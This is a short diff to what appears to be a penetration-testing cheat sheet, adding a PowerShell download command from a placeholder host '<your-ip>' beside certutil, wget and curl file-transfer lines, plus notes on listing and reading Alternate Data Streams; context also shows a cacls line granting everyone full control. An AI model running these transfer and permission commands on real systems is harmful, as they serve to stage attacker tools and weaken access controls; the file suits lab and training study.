@@ -14,7 +14,8 @@ python3 -m http.server <port>
 ~~~
 **Windows**
 certutil.exe -urlcache -f http://<link to file>:<port> <name file>
-
+iwr "http://<your-ip>:<port>/<path to file>" -o <output file>
+(iwr = invoke-webrequest)
 **Linux**
 wget http://<link to file>
 curl http://<link to file>
@@ -216,6 +217,11 @@ where /R <path c:\Windows> <search bash.exe>
 type <file>
 cacls (https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cacls)
 cacls <file> /E /P everyone:f
+
+# Alternate DataStreams
+dir /R
+more < <file>
+https://www.malwarebytes.com/blog/101/2015/07/introduction-to-alternate-data-streams
 ~~~
 
 
